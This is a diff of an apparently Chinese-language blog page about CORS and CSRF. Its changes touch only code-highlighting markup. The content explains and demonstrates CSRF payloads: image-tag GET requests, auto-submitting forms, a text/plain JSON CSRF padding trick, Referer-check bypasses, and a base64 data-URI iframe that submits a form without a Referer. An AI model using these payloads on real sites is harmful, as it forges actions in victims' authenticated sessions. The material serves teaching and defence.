@@ -55,17 +55,17 @@
 * Access-Control-Allow-Credentials: 允许这个请求使用cookie。</p>
 <p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
 </blockquote>
-<div class="highlight"><pre><span></span><span class="nv">XMLHttpRequest</span>:
+<div class="highlight"><pre><span></span><code><span class="n">XMLHttpRequest</span><span class="o">:</span>
 
-<span class="nv">var</span> <span class="nv">xhr</span> <span class="o">=</span> <span class="nv">new</span> <span class="nv">XMLHttpRequest</span><span class="ss">()</span><span class="c1">;</span>
-<span class="nv">xhr</span>.<span class="nv">open</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">GET</span><span class="s1">&#39;</span>, <span class="nv">url</span>, <span class="nv">true</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">xhr</span>.<span class="nv">withCredentials</span> <span class="o">=</span> <span class="nv">true</span><span class="c1">;</span>
-<span class="nv">xhr</span>.<span class="nv">onreadystatechange</span> <span class="o">=</span> <span class="nv">handler</span><span class="c1">;</span>
-<span class="nv">xhr</span>.<span class="k">send</span><span class="ss">()</span>
-</pre></div>
+<span class="n">var</span> <span class="n">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">XMLHttpRequest</span><span class="o">();</span>
+<span class="n">xhr</span><span class="o">.</span><span class="na">open</span><span class="o">(</span><span class="s1">&#39;GET&#39;</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="n">xhr</span><span class="o">.</span><span class="na">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+<span class="n">xhr</span><span class="o">.</span><span class="na">onreadystatechange</span> <span class="o">=</span> <span class="n">handler</span><span class="o">;</span>
+<span class="n">xhr</span><span class="o">.</span><span class="na">send</span><span class="o">()</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="n">JQuery</span><span class="p">:</span>
+<div class="highlight"><pre><span></span><code><span class="n">JQuery</span><span class="p">:</span>
 
 <span class="err">$</span><span class="p">.</span><span class="n">ajax</span><span class="p">(</span><span class="err">{</span>
     <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
@@ -73,7 +73,7 @@
     <span class="s1">&#39;xhrFields&#39;</span><span class="p">:</span> <span class="err">{</span><span class="s1">&#39;withCredentials&#39;</span><span class="p">:</span> <span class="k">true</span><span class="err">}</span><span class="p">,</span>
     <span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="k">handler</span>
     <span class="err">}</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 
 <ul>
@@ -82,25 +82,25 @@
 <h2>CSRF</h2>
 <p>两种类型：GET POST</p>
 <p>GET:</p>
-<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">wooyun</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">delete</span><span class="o">/</span><span class="n">id</span> <span class="o">/&gt;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">&lt;img src=http://wooyun.org/delete/id /&gt;</span>
+</code></pre></div>
 
 
 <p>POST:利用自动提交表单</p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">http://wooyun.org/add</span>  <span class="na">method=</span><span class="s">POST</span><span class="nt">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">http://wooyun.org/add</span>  <span class="na">method=</span><span class="s">POST</span><span class="nt">&gt;</span>
 
 <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;xx&quot;</span> <span class="na">value=</span><span class="s">&quot;11&quot;</span><span class="nt">&gt;</span>
 
 <span class="nt">&lt;/form&gt;</span>
 
 <span class="nt">&lt;script&gt;</span> document.forms[0].submit();<span class="nt">&lt;/script&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>常见防御有两种：检查Referer和使用token，如果同域下存在xss，除了验证码，其他都无法防御这个问题。</p>
 <p>程序后端可能使用REQUEST方式接受，但是程序默认使用POST，所以改为GET请求也可以。</p>
 <p>当采用Refer防御的时候，可以把请求中的这个字段修改如下：</p>
-<div class="highlight"><pre><span></span><span class="err">原始</span><span class="n">Refer</span><span class="err">：</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span>
+<div class="highlight"><pre><span></span><code><span class="err">原始</span><span class="n">Refer</span><span class="err">：</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span>
 
 <span class="err">绕过之后：</span>
 
@@ -109,13 +109,13 @@
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attack</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span>
 
 <span class="p">[</span><span class="err">空</span><span class="p">]</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>CSRF攻击会根据不同场景，大到垂直越权，这些场景的攻击都是<strong>跨域请求</strong>，并且比较重要的都是在受害者身份得到认证的以后发生的。</p>
 <h2>攻击方式</h2>
 <p>GET型的<code>CSRF</code>（带src属性的HTML标签都可以跨域发起GET请求）:</p>
-<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">link</span> <span class="n">href</span><span class="o">=</span><span class="ss">&quot;…&quot;</span><span class="o">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="n">link</span> <span class="n">href</span><span class="o">=</span><span class="ss">&quot;…&quot;</span><span class="o">&gt;</span>
 
 <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="ss">&quot;…&quot;</span><span class="o">&gt;</span>
 
@@ -134,16 +134,16 @@
 <span class="o">&lt;</span><span class="k">table</span> <span class="n">background</span><span class="o">=</span><span class="ss">&quot;…&quot;</span><span class="o">&gt;</span>
 
 <span class="err">…</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>POST请求，则必须使用表单提交的方式，这些标签可以使用JavaScript动态生成：</p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;script&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;script&gt;</span>
 
     new Image().src=&#39;http://wooyun.org/csrf&#39;;
 
 <span class="nt">&lt;/script&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>POST类型的CSRF</h3>
@@ -161,7 +161,7 @@
 <p>The POST body of an HTML form's request is always either <code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>, or <code>text-plain</code>。</p>
 </blockquote>
 <p>现在考虑下有一个对于post请求，其中body是json格式，服务端校验<code>Content-Type: application/json</code>字段</p>
-<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/member/shop/query</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/member/shop/query</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
 <span class="na">Content-Length</span><span class="o">:</span> <span class="l">147</span>
 <span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
@@ -173,18 +173,18 @@
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 
 <span class="p">{</span><span class="nt">&quot;bussid&quot;</span><span class="p">:</span> <span class="mi">110</span><span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>对于上面这个请求来说，假设他存在csrf，那么html怎么写？</p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;html&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://example.com&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype=</span><span class="s">&quot;text/plain&quot;</span><span class="nt">&gt;</span>
     <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&#39;{&quot;bussid&quot;: 1}&#39;</span> <span class="nt">/&gt;</span>
 <span class="nt">&lt;/form&gt;</span>
 <span class="nt">&lt;script&gt;</span>
     document.forms[0].submit();
 <span class="nt">&lt;/script&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>抓包之后可以发现，<code>POST</code>的body数据包是这样的：<code>{"bussid": 1}=</code>，没看错，后面多了一个等号。为毛会这样子，因为是这样的：</p>
@@ -202,41 +202,41 @@
 <p>"JSON does not have comments, A JSON encoder MUST NOT output comments, A JSON decodert MAY accept and ignore comments."</p>
 </blockquote>
 <p>解决方法是这样的，跟sql注入或者xss差不多，要把后面的<code>=</code>号补全，最后就是希望这个填充不会影响到请求。如下</p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;html&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://example.com&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype=</span><span class="s">&quot;text/plain&quot;</span><span class="nt">&gt;</span>
         <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&#39;{&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;&#39;</span><span class="na">value=</span><span class="s">&#39;test&quot;}&#39;</span> <span class="nt">/&gt;</span>
 <span class="nt">&lt;/form&gt;</span>
 <span class="nt">&lt;script&gt;</span>
         document.forms[0].submit();
 <span class="nt">&lt;/script&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>多出来的那一段是为了闭合上面的那个<code>=</code>，对于这个请求，其中的body是这个：
 <code>{"bussid": 1,"ignore_me":"=test"}</code></p>
 <p>只能希望服务器会丢弃掉多余的JSON，并且这种请求是<code>text/plain</code>格式。</p>
 <p>那么最后的问题来了：</p>
-<div class="highlight"><pre><span></span><span class="k">All</span> <span class="n">that</span> <span class="n">we</span> <span class="n">need</span> <span class="k">to</span> <span class="n">perform</span> <span class="n">a</span> <span class="n">JSON</span> <span class="n">CSRF</span> <span class="n">attack</span> <span class="k">is</span> <span class="k">to</span> 
-<span class="n">submit</span> <span class="n">a</span> <span class="k">valid</span> <span class="n">JSON</span> <span class="n">request</span> <span class="k">using</span> <span class="n">html</span> <span class="k">or</span> <span class="n">a</span> <span class="n">client</span> <span class="n">side</span> 
-<span class="n">code</span><span class="p">.</span> <span class="n">So</span><span class="p">,</span> <span class="n">Why</span> <span class="n">cannot</span> <span class="n">we</span> <span class="n">use</span> <span class="n">XMLHTTPRequest</span> <span class="k">object</span> <span class="k">to</span> 
-<span class="k">create</span> <span class="n">a</span> <span class="k">valid</span> <span class="n">JSON</span> <span class="n">request</span><span class="o">?</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">All that we need to perform a JSON CSRF attack is to </span>
+<span class="err">submit a valid JSON request using html or a client side </span>
+<span class="err">code. So, Why cannot we use XMLHTTPRequest object to </span>
+<span class="err">create a valid JSON request?</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nv">html</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nv">script</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js</span><span class="s2">&quot;</span><span class="o">&gt;&lt;/</span><span class="nv">script</span><span class="o">&gt;</span>
-<span class="k">if</span> <span class="ss">(</span><span class="nv">window</span>.<span class="nv">XMLHTTPReuquest</span><span class="ss">)</span>{
-<span class="nv">var</span> <span class="nv">xmlhttp</span><span class="o">=</span><span class="nv">new</span> <span class="nv">XMLHttpRequest</span><span class="ss">()</span><span class="c1">;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+if (window.XMLHTTPReuquest){
+var xmlhttp=new XMLHttpRequest();
 }
-<span class="k">else</span>{
-<span class="nv">var</span> <span class="nv">xmlhttp</span><span class="o">=</span><span class="nv">new</span> <span class="nv">ActiveXObject</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">Microsoft.XMLHTTP&quot;);</span>
+else{
+var xmlhttp=new ActiveXObject(&#39;Microsoft.XMLHTTP&quot;);
 }
-<span class="nv">xmlhttp</span>.<span class="nv">open</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">POST</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">http://sample.com</span><span class="s2">&quot;</span>, <span class="nv">true</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">xmlhttp</span>.<span class="nv">withCredentials</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">true</span><span class="s2">&quot;</span><span class="c1">;</span>
-<span class="nv">xmlhttp</span>.<span class="nv">setRequestHeader</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Content-Type</span><span class="s2">&quot;</span>, <span class="s2">&quot;</span><span class="s">application/json;charset=UTF-8</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">xmlhttp</span>.<span class="k">send</span><span class="ss">(</span><span class="nv">JSON</span>.<span class="nv">stringify</span><span class="ss">(</span>{<span class="s2">&quot;</span><span class="s">buddis</span><span class="s2">&quot;</span>: <span class="mi">1</span>}<span class="ss">))</span><span class="c1">;</span>
-<span class="o">&lt;/</span><span class="nv">html</span><span class="o">&gt;</span>
-</pre></div>
+xmlhttp.open(&quot;POST&quot;, &quot;http://sample.com&quot;, true);
+xmlhttp.withCredentials=&quot;true&quot;;
+xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);
+xmlhttp.send(JSON.stringify({&quot;buddis&quot;: 1}));
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
 
 
 <p>这个上面的代码是不会成功的，因为当跨域访问的时候，浏览器会先向这个地址发起一个OPTION请求，询问是否可用，然后再发起实际的请求。会用到以下的header：</p>
@@ -257,12 +257,12 @@
 <p>如果防御CSRF的策略是这样的：</p>
 <p>验证Origin或者Referer，如果Referer是空，请求放行。这种防御有个缺陷：</p>
 <p>使用iframe的data协议或者https发起的请求是没有Referer的。</p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;html&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span><span class="nt">&gt;</span>
     <span class="nt">&lt;/body&gt;</span> 
 <span class="nt">&lt;/html&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p><a href="http://0x007.blog.51cto.com/6330498/1610946">http://0x007.blog.51cto.com/6330498/1610946</a></p>
